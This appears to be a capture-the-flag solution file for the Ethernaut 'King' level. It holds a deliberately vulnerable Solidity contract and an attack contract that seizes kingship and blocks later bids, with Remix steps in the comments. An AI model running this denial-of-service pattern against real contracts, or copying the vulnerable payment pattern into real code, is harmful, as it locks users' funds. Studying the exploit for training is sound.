// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {
    address payable king;
    uint256 public prize;
    address payable public owner;

    constructor() public payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}

contract AttackKing {
    King king;

    constructor(King _king) public {
        king = King(_king);
    }

    // You can also perform a DOS by consuming all gas using assert.
    // This attack will work even if the calling contract does not check
    // whether the call was successful or not.

    function claimKingship(address payable _to) public payable {
        (bool sent, ) = _to.call.value(msg.value)("");
        require(sent, "Failed to send value!");
    }

    // check the prize value; we need to set the msg.value in the Remix IDE to make sure we bid more than current prize
    // set the contract instance address in the field for claimKingship function
    // run the claimKingship function

    // Reference - https://dev.to/nvn/ethernaut-hacks-level-9-king-12
}
